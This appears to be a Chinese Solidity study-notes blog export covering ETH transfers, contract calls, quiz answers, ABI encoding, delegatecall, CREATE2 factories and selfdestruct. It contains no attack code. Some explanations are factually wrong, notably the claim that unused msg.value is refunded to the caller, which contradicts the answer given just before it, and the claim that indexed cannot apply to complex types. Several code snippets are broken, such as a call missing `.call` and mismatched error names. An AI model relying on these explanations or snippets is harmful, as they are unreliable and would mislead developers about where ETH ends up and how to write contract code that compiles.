send()的gas限制是2300，足够用于转账，但对方合约的**fallback()或receive()**函数不能实现太复杂的逻辑。\n·    send()如果转账失败，不会revert。\n·    send()的返回值是bool，代表着转账成功或失败，需要额外代码处理一下\n12345678910error SendFailed(); // 用send发送ETH失败error// send()发送ETHfunction sendETH(address payable _to, uint256 amount) external payable&#123;    // 处理下send的返回值，如果失败，revert交易并发送error    bool success = _to.send(amount);    if(!success)&#123;        revert SendFailed();    &#125;&#125;\n\n\n\n3.Call用法\n1接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)\n\n·    call()没有gas限制，可以支持对方合约**fallback()或receive()**函数实现复杂逻辑。\n·    call()如果转账失败，不会revert。\n·    call()的返回值是(bool, bytes)，其中bool代表着转账成功或失败，需要额外代码处理一下\n1234567891011error CallFAiled()// 用call发送ETH失败error// call()发送ETHfunction callETH(address payable _to, uint256 amount) external payable&#123;    // 处理下call的返回值，如果失败，revert交易并发送error    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);    if(!success)&#123;        revert CallFailed();    &#125;&#125;\n\n·    call没有gas限制，最为灵活，是最提倡的方法；\n·    transfer有2300 gas限制，但是发送失败会自动revert交易，是次优选择；\n·    send有2300 gas限制，而且发送失败不会自动revert交易，几乎没有人用它。\n调用其他合约如何调用\n​\t可以利用合约的地址和合约代码（或接口）来创建合约的引用：_Name(_Address)，其中_Name是合约名，应与合约代码（或接口）中标注的合约名保持一致，_Address是合约地址。然后用合约的引用来调用它的函数：_Name(_Address).f()，其中f()是要调用的函数。\n1.传入合约地址我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。\n以调用OtherContract合约的setX函数为例，我们在新合约中写一个callSetX函数，\n传入已部署好的OtherContract合约地址_Address和setX的参数x：\n123function callSetX(address _address,uint256 x)external&#123;\tOtherContract(_Address).setX(x);&#125;\n\n\n\n复制OtherContract合约的地址，填入callSetX函数的参数中，成功调用后，调用OtherContract合约中的getX验证x变为123\n2.传入合约变量我们可以直接在函数里传入合约的引用，只需要把上面参数的address类型改为目标合约名\n比如上述的OtherContract\n(ps: 该函数参数OtherContract _Address底层类型仍然是address，生成的ABI中、调用callGetX时传入的参数都是address类型)\n例子： \n通过传入合约变量调用目标合约的函数\n123function callGetX(OtherContract _Address) external view returns(uint x)&#123;\tx = _Address.getX();&#125;\n\n\n\n复制OtherContract合约的地址，填入callGetX函数的参数中，调用后成功获取x的值\n3. 创建合约变量123456function callGetX(address _Address) external view returns(uint x)&#123;\t//创建变量\tOtherContract oc = OtherContract(_Address);//oc为OtherContract别名\tx = oc.getX;&#125;\n\n复制OtherContract合约的地址，填入callGetX2函数的参数中，调用后成功获取x的值\n4.调用合约并发送ETH如果目标合约的函数是payable的，那么我们可以通过调用它来给合约转账：\n1_Name(_Address).f&#123;value: _Value&#125;()\n\n\n\n其中**_Name是合约名，_Address是合约地址，f是目标函数名，_Value是要转的ETH数额（以wei**为单位）。\nOtherContract合约的setX函数是payable的，在下面这个例子中我们通过调用setX来往目标合约转账。\n123function setXTransferETH(address otherContract, uint256 x) payable external&#123;   OtherContract(otherContract).setX&#123;value: msg.value&#125;(x); &#125;\t\n\n\n\n利用call调用合约call 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为(bool, bytes memory)，分别对应call是否成功以及目标函数的返回值。\n不推荐用call来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数\n当我们不知道对方合约的源代码或ABI，就没法生成合约变量；这时，我们仍可以通过call调用对方合约的函数\n使用规则\n1目标合约地址.call(字节码);\n\n\n\n（其中字节码利用结构化编码函数abi.encodeWithSignature获得：\n1abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)\n\n\n\n函数签名为”函数名（逗号分隔的参数类型）”\n1abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)\n\n\n\n另外call在调用合约时可以指定交易发送的ETH数额和gas数额：\n1目标合约地址.call&#123;value:发送数额, gas:gas数额&#125;(字节码);\n\n\n\n利用Call调用合约举例\n\nResponse事件\n\n12// 定义Response事件，输出call返回的结果success和data,方便观察返回值event Response(bool success, bytes data);\n\n\n\n\n调用setX函数\n定义callSetX函数来调用目标合约的setX()，转入msg.value数额的ETH，并释放Response事件输出success和data：\n123456789function callSetX(address payable _addr,uint256 x)public payable&#123;//同时还可发送eth,_addr是目标合约的地址(bool success,bytes memory data) = _addr&#123;value:msg.value&#125;(abi.encodeWithSignature(&quot;setX(uint256)&quot;, x));emit Response(success,data);//释放事件&#125;\n\n​\t当我们此时调用callSetX把状态变量_x改为5，参数为OtherContract地址和5，由于目标函数setX()没有返回值，因此Response事件输出的data为0x，也就是空。\n\n调用getX函数\n所以我们还需要调用getX()函数用于返回目标合约X(uint256)的值\n\n\n12345678function callGetX(address _addr) external returns(uint256)&#123;\t(bool success, bytes memory data) = _addr.call(\t//可以利用abi.decode来解码call的返回值data，并读出数值。        abi.encodeWithSignature(&quot;getX()&quot;));                emit Response(success,data);        return abi.decode(data, (uint256));&#125;\n\n从Response事件的输出，我们可以看到data为0x0000000000000000000000000000000000000000000000000000000000000005。而经过abi.decode，最终返回值为5。\n\n调用不存在的函数\n\n如果给call输入的函数不存在于目标合约，那么目标合约的fallback函数会被触发。\n123456789function callNonExist(address _addr)external&#123;//call不存在的foo()函数(bool success, bytes memory data)=_addr.call(abi.encodeWithSignature(&quot;foo(uint256)&quot;)\t);\t\temit Response(success,data);&#125;\n\ncall了不存在的foo函数。call仍能执行成功，并返回success，但其实调用的目标合约fallback函数\n题：\n​\t下列关于事件的说法中，错误的是\n\n（选择一个答案） \nA. Solidity中的事件（event）是EVM上日志的抽象。\nB. 事件的声明由event关键字开头，然后跟事件名称。\nC. 链上存储数据比存储事件的成本低。\nD. 应用程序（ether.js）可以通过RPC接口订阅和监听这些事件，并在前端做响应。\n解析：\n\n选项 A：正确。事件在 Solidity 中是 EVM 上日志的抽象，事件记录在链上日志中，但不直接参与合约逻辑。\n选项 B：正确。事件的声明确实是通过 event 关键字定义的。\n选项 C：错误。实际上，存储事件的成本比直接在链上存储数据要低，因为事件被存储在交易日志中，而不占用合约的存储空间，这降低了成本。\n选项 D：正确。应用程序（如 ethers.js）可以通过 RPC 接口监听这些事件，并在前端作出相应的反应。\n\n正确答案是：\nC. 链上存储数据比存储事件的成本低。\n​\t\n\nindexed关键字可以修饰任意类型的变量 选择一个答案 A. 正确 B. 错误\n\n解析：\n在 Solidity 中，indexed 关键字不能修饰任意类型的变量。最多只能对事件中的三个参数使用 indexed 修饰，并且它只适用于某些基本类型，例如 address、uint、int 和 bytes 等。复杂的结构体或数组类型无法被 indexed 修饰。所以错误。\n\n如果合约B继承了合约A，合约C要继承A和B，要怎么写？\n\n 选择一个答案\n A. contract C is A, B\n B. contract C is B, A\n C. contract C is B\n父合约在子合约之前,A为正确选项\n合约B继承了合约A，两个合约都有pop()函数，下面选项中，正确调用父合约函数的是：\n 选择一个答案 \n A. A.pop();\n B. super.pop();\n C. 都正确\n解析：\n在 Solidity 中，当子合约 B 继承了父合约 A，并且两个合约中都存在同名函数 pop() 时，可以通过以下两种方式调用父合约的 pop() 函数：\n·    A.pop();：直接通过父合约的名称调用父合约的 pop()。\n·    super.pop();：使用 super 关键字调用父合约的 pop()，特别适合在多重继承的情况下调用父类函数。\n因此，两种方式都可以正确调用父合约的 pop() 函数,选C\n\nfunction a() public override{} 意思是\n\n​\t选择一个答案 \n​\tA. 希望子合约重写函数a()\n​\tB. 函数a()重写了父合约中的同名函数\n解析：\n在 Solidity 中，override 关键字表示该函数是对父合约中同名函数的重写。因此，function a() public override {} 的意思是 该函数 a() 重写了父合约中的同名函数。\n\n合约B继承了合约A，下面选项中，正确调用父合约构造函数的是：\n\n​\t\tA. constructor(uint _num) { A(_num);} \n​\t\tB. constructor(uint _num) { A.constructor(_num);}\n​\t\tC. constructor(uint _num) A(_num){}\n解析：\n在 Solidity 中，如果合约 B 继承了合约 A，并且需要在合约 B 的构造函数中调用合约 A 的构造函数，正确的写法是 constructor(uint _num) A(_num){}。\n\n被导入文件中的全局符号想要被其他合约单独导入，应该怎么编写？\n\n（选择一个答案）\n​\tA. 将合约结构包含\n​\tB. 包含在合约结构中\n​\tC. 与合约并列在文件结构中\n解析\n当文件中的全局符号（例如函数、结构体、枚举等）希望被其他合约单独导入时，需要将这些符号定义在合约之外，即与合约并列在文件结构中，而不是包含在特定合约的内部。\n这样一来，这些符号就在文件的全局作用域中，便于其他文件或合约通过 import 语句直接导入和使用，选C。\n\nSolidity中import的作用是：\n A. 导入其他合约中的接口\nB. 导入其他合约中的私有变量 \nC. 导入其他合约中的全局符号 \nD. 导入其他合约中的内部变量\n\n\n解析\n在 Solidity 中，import 关键字用于导入其他文件中定义的全局符号，如合约、库、结构体、枚举等。这使得开发者可以在当前文件中使用其他文件中的符号。\n选项分析：\n·    A. 导入其他合约中的接口：虽然可以导入接口，但 import 并不限于接口。\n·    B. 导入其他合约中的私有变量：私有变量不能在其他合约中直接访问，import 不能导入私有变量。\n·    C. 导入其他合约中的全局符号：这是正确答案，因为 import 可以导入各种全局符号。\n·    D. 导入其他合约中的内部变量：import 不能直接导入内部变量（internal 变量），但可以通过继承的方式访问。\n因此，正确答案是 C。\n\n以下import写法错误的是：\n\n​\t A. import from “.&#x2F;Yeye.sol”;\n B. import &#123;Yeye&#125; from &quot;./Yeye.sol&quot;;\n \n C. import &#123;Yeye as Wowo&#125; from &quot;./Yeye.sol&quot;; \n \n D. import * as Wowo from &quot;./Yeye.sol&quot;;\n\n解析\n*在 Solidity 中，import 语句需要指定导入内容或者使用通配符 * 进行导入。选项 A 缺少导入的具体内容，这是错误的写法。正确的写法应当明确指定要导入的符号或使用通配符 。\n选项分析：\n·    A. import from “.&#x2F;Yeye.sol”;：错误。未指定导入的内容，语法不完整。\n·    B. import {Yeye} from “.&#x2F;Yeye.sol”;：正确。导入了 Yeye 合约。\n·    C. import {Yeye as Wowo} from “.&#x2F;Yeye.sol”;：正确。导入并将 Yeye 别名为 Wowo。\n·    D. import * as Wowo from “.&#x2F;Yeye.sol”;：正确。导入 Yeye.sol 中所有符号，并以 Wowo 作为命名空间。\n  什么是命名空间？\n​\t命名空间帮助开发者将相关的功能或数据组织在一起，使得代码逻辑更加清晰。\n​\t通过命名空间的前缀，开发者可以快速了解某个标识符的来源和用途。\n因此，A 是错误的导入写法。\n\nimport导入文件中的全局符号可以单独指定其中的： \n A. 合约\n B. 纯函数\n C. 结构体类型\n D. 以上都可以\n\n\n解析\n​\t 在 Solidity 中，import 语句可以单独指定要导入的符号，包括合约、函数、结构体等。例如：\n·    合约：可以通过 import { ContractName } from “file.sol”; 来导入文件中的特定合约。\n·    纯函数：如果文件中定义了 pure 或 view 的全局函数（从 Solidity 0.6.0 开始支持的功能），也可以通过 import { functionName } from “file.sol”; 来单独导入。\n·    结构体类型：可以使用 import { StructName } from “file.sol”; 来单独导入结构体定义。\n因此，D. 以上都可以 是正确答案。\n* \n\n解析\n假设 SendETH 合约中 callETH 函数的代码如下：\n123456789function callETH(address payable _to) external payable &#123;  // 假设发送 1ETH 给 ReceiveETH 合约  (bool success, ) = _to.call&#123;value: 1 ether&#125;(&quot;&quot;);  require(success, &quot;Transfer failed&quot;);&#125;\n\n\n\n在这种情况下，以下是执行步骤和各合约的 ETH 余额变化：\n 交易初始化：Vitalik 调用 SendETH 合约的 callETH 函数，没有设置 msg.value。SendETH 合约接收到 2 ETH。\n 转账执行：callETH 函数内部使用了 call{value: 1 ether}(“”)，向 ReceiveETH 合约发送 1 ETH。因此，ReceiveETH 合约将接收到 1 ETH，SendETH 合约的余额减少 1 ETH。\n最终余额：\no  SendETH 合约：2 ETH（初始接收） - 1 ETH（发送） &#x3D; 1 ETH\no  ReceiveETH 合约：接收 1 ETH\n由于没有设置msg.value，执行完交易后，SendETH 合约的余额为 1 ETH，而 ReceiveETH 合约的余额为 1 ETH。\n如果设置了msg.value，则SendETH为0ETH，\n这是因为 msg.value 是直接随交易发送到 SendETH 合约的，以支付调用 callETH 函数的资金。这笔 2 ETH 会被发送到 SendETH 合约，但 SendETH 合约并不保留这 2 ETH，而是立即在 callETH 函数中使用其中的 1 ETH 进行转账，剩余的 1 ETH 也不被 SendETH 合约保留。\n以下是更详细的解释：\n\n初始交易的 2 ETH：Vitalik 发送的 msg.value 是 2 ETH，这笔资金在调用 SendETH 合约的 callETH 函数时传入。\n\n发送 1 ETH 给 ReceiveETH：callETH 函数中使用了 call{value: 1 ether}(“”) 向 ReceiveETH 合约转账 1 ETH。\n\n剩余的 1 ETH：由于 callETH 函数中并没有将剩余的 1 ETH 存入 SendETH 合约的余额（例如未将 msg.value - 1 ether 显式存入），交易结束时，这部分 1 ETH 会被直接退还给调用者（Vitalik），因为 Solidity 中的函数执行完毕后未被使用的 msg.value 会被退还。\n\n\n总结\n因此，交易完成后：\n·    SendETH 合约没有余额，余额为 0 ETH\n·    ReceiveETH 合约收到并保留了 1 ETH\n\n下列关于智能合约调用其他智能合约的说法，正确的一项是：\n 选择一个答案\n A. 智能合约调用其他智能合约这一功能，主要起到了方便代码复用的作用\n B. 在智能合约A中调用智能合约B，比起从EOA直接调用智能合约B，要更节省gas \n C. 智能合约B中可见性为internal的函数也可以被智能合约A调用\n\n\n解析\n· 选项 A 是正确的。智能合约调用其他智能合约确实可以方便代码复用。这样可以减少重复代码并提高合约的模块化，使开发更加灵活和高效。\n· 选项 B 是不正确的。在智能合约 A 中调用智能合约 B 实际上比直接从外部账户（EOA）调用智能合约 B 消耗更多的 Gas，因为这涉及到更多的操作步骤（合约 A 需要发起外部调用），并没有节省 Gas 的效果。\n· 选项 C 是不正确的。internal 可见性表示函数只能在同一个合约或继承的合约中调用，不能被其他合约直接调用。因此，合约 A 无法直接调用合约 B 中 internal 的函数。\n\n下面哪种使用方式不正确？\n\n​\tA. address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, \t“MyName”)); \n​\tB. address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, \t\t“MyName”)); \n​\tC. address.call{gas: 1000000, value: 1 ether} \n​\tD. address(nameReg).call{gas: 1000000, value: 1 ether}\n​\t\n解析\n逐一分析\n 选项 A：address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, “MyName”));\no 这是正确的写法，使用了 .call{gas: …} 发送指定的 gas 量，并通过 abi.encodeWithSignature 来对函数调用参数进行编码。此调用会尝试在 nameReg 地址处调用 register(string) 函数，提供字符串 “MyName” 作为参数。\n选项 B：address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, “MyName”));\no 这是正确的写法，使用了 .call{value: …} 发送指定的 value（即 1 ether），并且使用了 abi.encodeWithSignature 对函数和参数进行编码。\no 该调用会在发送 1 ether 的情况下，尝试调用 nameReg 地址上的 register(string) 函数。\n 选项 C：address.call{gas: 1000000, value: 1 ether}\no 这是不正确的写法。address.call{…} 的语法要求提供被调用的目标地址，而这里没有指定有效地址和编码的数据。正确写法应为 address(target).call{gas: …, value: …}(data)。\no 这里 address 作为数据类型使用是不对的，应该是一个具体的地址实例，比如 address(target)。\n 选项 D：address(nameReg).call{gas: 1000000, value: 1 ether}\no 这是正确的写法，因为 address(nameReg).call{gas: …, value: …}(data) 提供了 gas 和 value，并调用 nameReg 这个合约地址。\n因此，C 是错误的使用方式，因为它缺少了有效的地址实例（目标地址）和调用的数据。\n\n解析\n1OtherContract other = OtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);\n\n\n\no 这种写法直接实例化了 OtherContract 合约。因为 OtherContract 合约实现了 IOtherContract 接口，这种写法允许我们调用 OtherContract 中的所有公共函数。\n1IOtherContract other = IOtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);\n\n\n\no 这种写法使用了 IOtherContract 接口进行实例化，可以用来调用 IOtherContract 中声明的函数。只要 OtherContract 实现了 IOtherContract 接口，这种方式也是正确的。\n因此，**(1) 和 (2) 均是正确的调用方式**，可以使用任意一种方法来调用合约。\n\n解析\n· 选项 A：MyContract 是 OtherContract 的子类\no 不正确。MyContract 并没有继承 OtherContract，它只是实例化了 OtherContract 并通过地址直接调用它的函数，因此不构成继承关系。\n· 选项 B：MyContract 是 IOtherContract 的一个实现\no 不正确。MyContract 也没有实现 IOtherContract 接口。它只是定义了与 OtherContract 交互的函数，而不是实现 IOtherContract 中的所有接口。\n· 选项 C：MyContract 需要 0xd9145CCE52D386f254917e481eB44e9943F39138 的某种许可，才可以调用其中的函数\no 不正确。只要 OtherContract 中的函数是 external 或 public 且无访问权限限制，任何合约或外部账户都可以调用它。OtherContract 中的 setX 和 getX 都没有额外的权限控制。\n· 选项 D：MyContract 的函数 call_setX 可以实现，这意味着 OtherContract 中 setX 的权限没有门槛，存在安全隐患\no 正确。OtherContract 的 setX 函数是 external 并且没有权限控制，因此任何合约或账户都可以调用并修改 _x 的值。这确实可能带来安全隐患，尤其是在 _x 变量值的更改可能影响合约逻辑的情况下。如果不希望外部随意调用，应该在 setX 函数中添加访问控制。\n","url":"2024/11/11/solidity基础（2）/","date":"2024-11-11"},{"title":"solidity基础003","content":"关键词：ABI  delegatecall create&#x2F;create2  selector try catch\nABI编码解码ABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。\nABI编码：\n1.   abi.encode\n用于和合约交互，并将每个参数填充为32字节的数据，并拼接在一起\n12345function encode() public view returns(bytes memory result) &#123;  result = abi.encode(x, addr, name, array);&#125;\n\n\n\n编码的结果为\n0x000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000\n由于abi.encode将每个数据都填充为32字节，中间会有很多0。\n2.   abi.encodePacked\n将给定参数根据其所需最低空间编码。它类似 abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint8类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据的hash时\n12345function encodePacked() public view returns(bytes memory result) &#123;  result = abi.encodePacked(x, addr, name, array);&#125;\n\n\n\n编码的结果为\n0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006，由于abi.encodePacked对编码进行了压缩，长度比abi.encode短很多。\n3.   abi.encodeWithSignature\n与abi.encode功能类似，只不过第一个参数为函数签名，比如”foo(uint256,address,string,uint256[2])”。当调用其他合约的时候可以使用。等同于在abi.encode编码结果前加上了4字节的函数选择器。 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用\n4.   abi.encodeWithSelector\n与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节\nABI解码：\nabi.decode\nabi.decode用于解码abi.encode生成的二进制编码，将它还原成原本的参数。\n12345function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) &#123;  (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));&#125;\n\n\n\nABI的使用场景1.   在合约开发中，ABI常配合call来实现对合约的底层调用。\n12345678bytes4 selector = contract.getValue.selector;  bytes memory data = abi.encodeWithSelector(selector, _x); (bool success, bytes memory returnedData) = address(contract).staticcall(data); require(success);  return abi.decode(returnedData, (uint256)); \n\n\n\n2.   ethers.js中常用ABI实现合约的导入和函数调用。\n 12345const wavePortalContract = new ethers.Contract(contractAddress, contractABI, signer); /*   Call the getAllWaves method from your Smart Contract   */ const waves = await wavePortalContract.getAllWaves();\n\n\n\n3.   对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。\nHash在solidity的应用一个好的哈希函数应该具有以下几个特性：\n\n单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。\n\n灵敏性：输入的消息改变一点对它的哈希改变很大。\n\n高效性：从输入的消息到哈希的运算高效。\n\n均一性：每个哈希值被取到的概率应该基本相等。\n\n抗碰撞性：\n\n\n弱抗碰撞性：给定一个消息x，找到另一个消息x’，使得hash(x) &#x3D; hash(x’)是困难的。\n强抗碰撞性：找到任意x和x’，使得hash(x) &#x3D; hash(x’)是困难的。\n\n\n生成数据唯一标识\n\n加密签名\n\n安全加密\n\n\nSolidity中常用的哈希函数：\nKeccak256\n\n用法：哈希 &#x3D; keccak256(数据);\n（Sha3和Keccak256不是同一物：Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的）\n\nkeccak256来生成一些数据的唯一标识\n\n弱抗碰撞性（即给定一个消息x，找到另一个消息x’，使得hash(x) &#x3D; hash(x’)是困难的）\n\n\n1234567891011// 弱抗碰撞性function weak(  string memory string1  )public view returns (bool)&#123;  return keccak256(abi.encodePacked(string1)) == _msg;&#125;\n\n\n\n\n强抗碰撞性（到任意不同的x和x’，使得hash(x) &#x3D; hash(x’)是困难的。）\n\n 12345678910111213// 强抗碰撞性function strong(   string memory string1,   string memory string2  )public pure returns (bool)&#123;  return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2));&#125;\n\n\n\n\n\nDelegatecall定义是Solidity中地址类型的低级成员函数\n\n\n 和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额\n注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。\n语法1目标合约地址.delegatecall(二进制编码)\n\n\n\nps： 二进制编码用结构化编码函数abi.encodeWithSignature获得\n1abi.encodeWithSignature(&quot;函数签名&quot;，逗号分隔的具体参数)\n\n\n\n应用场景\n代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：代理合约（Proxy Contract）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过delegatecall执行。当升级时，只需要将代理合约指向新的逻辑合约即可。\n\nEIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合约的代理合约。\n\n\n对比call调用&amp;dalecatecall调用\nps:\n函数签名为”函数名（逗号分隔的参数类型）”。例如\n1abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)\n\n\n\n首先：写一个被调用的合约C\n1234567891011contract C &#123;    uint public num;    address public sender;//将num设定为传入的_num，并且将sender设为msg.sender    function setVars(uint _num) public payable &#123;        num = _num;        sender = msg.sender;    &#125;&#125;\n\n再写：发起调用的合约B\n123456//合约B必须和目标合约C的变量存储布局必须相同contract B&#123;\tuint public num;    address public sender;&#125;\n\n\n\n\n\n接下来，分别用call和delegatecall来调用合约C的setVars函数，更好的理解它们的区别\n用call调用：123456789// 通过call来调用C的setVars()函数，将改变合约C里的状态变量function callSetVars(address_addr, uint _num) external payable&#123;//两个参数_addr和_num，分别对应合约C的地址和setVars的参数\t(bool success,bytes memory data) = _addr.call(abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)\t);&#125;\n\n\n\n​\t运行后，合约C中的状态变量将被修改：num被改为10，sender变为合约B的地址\n用dalegatecall调用12345678// 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量function delegatecallSetVars(address _addr, uint _num) external payable&#123;    // delegatecall setVars()    (bool success, bytes memory data) = _addr.delegatecall(        abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)    );&#125;\n\n\n\n由于是delegatecall，上下文为合约B。在运行后，合约B中的状态变量将被修改：num被改为100，sender变为你的钱包地址。合约C中的状态变量不会被修改。\n总结当用户A通过合约B来delegatecall合约C时,执行了(   )          的函数，语境是 (  )        ,msg.sender和msg.value来自(   )         ,并且如果函数改变一些状态变量,产生的效果会作用于(   )            的变量上 \n所以答案为：C,B,A,B\n当用户 A 通过合约 B 使用 delegatecall 调用合约 C 时，以下情况会发生：\n\n执行了 C 的函数：\n\n delegatecall 会调用目标合约（即合约 C）中的指定函数代码。\n\n语境是 B：\n\n delegatecall 会在调用者合约（即合约 B）的上下文中执行代码。这意味着合约 C 的代码会在合约 B 的存储和上下文中运行，就像这段代码属于 B 一样。\n\nmsg.sender 和 msg.value 来自 A：\n\n delegatecall 保留了原始调用者的信息。也就是说，msg.sender 和 msg.value 都来自于发起调用的用户 A。\n\n状态变量的影响作用于 B 的变量上：\n\n 由于 delegatecall 在调用合约 B 的存储和上下文中执行，所以任何状态变量的修改都只会影响合约 B 中的变量，不会影响合约 C。\n在合约中创建新合约智能合约同样也可以创建新的智能合约\n去中心化交易所uniswap就是利用工厂合约（PairFactory）创建了无数个币对合约（Pair）\n关于工厂合约Pair合约很简单，包含3个状态变量：factory，token0和token1。\n构造函数constructor在部署时将factory赋值为工厂合约地址。initialize函数会由工厂合约在部署完成后手动调用以初始化代币地址，将token0和token1更新为币对中两种代币的地址。\n工厂合约（PairFactory）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有代币地址。\nPairFactory合约只有一个createPair函数，根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中\n1Pair pair = new Pair();\n\n就是创建合约的代码\n当 PairFactory 合约调用 new Pair() 来创建一个新的 Pair 合约实例时，Pair 合约的 msg.sender 将是 PairFactory 合约本身\nCreate用法1234567//new一个合约，并传入新合约构造函数所需的参数Contract x = new Contract&#123;value:_value&#125;(params)//其中Contract是要创建的合约名，x是合约对象（地址），如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数\n\n\n\nCreate2作用​\t让合约地址独立于未来的事件\n​\t不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用CREATE2创建的合约地址由4个部分决定：\n·      0xFF：一个常数，避免和CREATE冲突\n·      CreatorAddress: 调用 CREATE2 的当前合约（创建合约）地址。\n·      salt（盐）：一个创建者指定的bytes32类型的值，它的主要目的是用来影响新创建的合约的地址。\n·      initcode: 新合约的初始字节码（合约的Creation Code和构造函数的参数）。\n1新地址 = hash(&quot;0xFF&quot;,创建者地址, salt, initcode)\n\n\n\n如何使用CREATE2的用法和之前讲的CREATE类似，同样是new一个合约，并传入新合约构造函数所需的参数，只不过要多传一个salt参数：\n123456Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)//其中Contract是要创建的合约名，x是合约对象（地址），_salt是指定的盐；如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。\n\n\n\n构建工厂合约2 123456789101112131415161718192021contract PairFactory2&#123;    mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址    address[] public allPairs; // 保存所有Pair地址    function createPair2(address tokenA, address tokenB) external returns (address pairAddr) &#123;        require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突        // 用tokenA和tokenB地址计算salt        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序        bytes32 salt = keccak256(abi.encodePacked(token0, token1));        // 用create2部署新合约        Pair pair = new Pair&#123;salt: salt&#125;();         // 调用新合约的initialize方法        pair.initialize(tokenA, tokenB);        // 更新地址map        pairAddr = address(pair);        allPairs.push(pairAddr);        getPair[tokenA][tokenB] = pairAddr;        getPair[tokenB][tokenA] = pairAddr;    &#125;&#125;\n\n\n\n工厂合约（PairFactory2）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有币对地址。\nPairFactory2合约只有一个createPair2函数，使用CREATE2根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中\n1Pair pair = new Pair&#123;salt: salt&#125;(); \n\n\n\n就是利用CREATE2创建合约的代码，非常简单，而salt为token1和token2的hash：\n12345678bytes32 salt = keccak256(abi.encodePacked(token0, token1));predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(                bytes1(0xff),                address(this),                salt,                keccak256(abi.encodePacked(type(Pair).creationCode, abi.encode(address(this))))            )))));\n\n\n实际应用场景\n交易所为新用户预留创建钱包合约地址。\n由 CREATE2 驱动的 factory 合约，在Uniswap V2中交易对的创建是在 Factory中调用CREATE2完成。这样做的好处是: 它可以得到一个确定的pair地址, 使得 Router中就可以通过 (tokenA, tokenB) 计算出pair地址, 不再需要执行一次 Factory.getPair(tokenA, tokenB) 的跨合约调用。\n\nselfdestruct\nselfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。\n\n不建议使用\n\n\n目前来说：\n\n已经部署的合约无法被SELFDESTRUCT了。\n如果要使用原先的SELFDESTRUCT功能，必须在同一笔交易中创建并SELFDESTRUCT\n\n如何使用1selfdestruct(_addr)；\n\n其中_addr是接收合约中剩余ETH的地址。_addr 地址不需要有receive()或fallback()也能接收ETH\n注意事项\n对外提供合约销毁接口时，最好设置为只有合约所有者可以调用，可以使用函数修饰符onlyOwner进行函数声明。\n\n当合约中有selfdestruct功能时常常会带来安全问题和信任问题，合约中的selfdestruct功能会为攻击者打开攻击向量(例如使用selfdestruct向一个合约频繁转入token进行攻击，这将大大节省了GAS的费用，虽然很少人这么做)，此外，此功能还会降低用户对合约的信心。\n\n\n函数选择器Selector\nmsg.datamsg.data是Solidity中的一个全局变量，值为完整的calldata（调用函数时传入的数据\n举例: 